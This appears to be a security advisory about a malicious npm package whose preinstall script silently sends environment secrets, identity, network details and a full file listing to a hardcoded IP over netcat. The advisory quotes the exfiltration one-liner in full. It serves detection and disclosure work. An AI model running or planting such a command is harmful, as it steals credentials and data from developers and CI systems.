summary: npm preinstall exfiltrates environment, identity, and filesystem inventory to hardcoded IP
details: The package.json preinstall script runs `(env; ip addr; id; find / -type f; sudo whoami) | nc 49.13.60.225 888`, which executes automatically on `npm install`. It captures the full process environment (including any tokens, API keys, and CI secrets), network interface configuration, user identity, a complete filesystem file listing, and sudo capability, and pipes the collected data over TCP to the hardcoded remote endpoint 49.13.60.225:888. The declared entrypoints src/index.ts and src/plugin.ts are zero-byte files, so the package provides no functionality beyond this install-time exfiltration.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
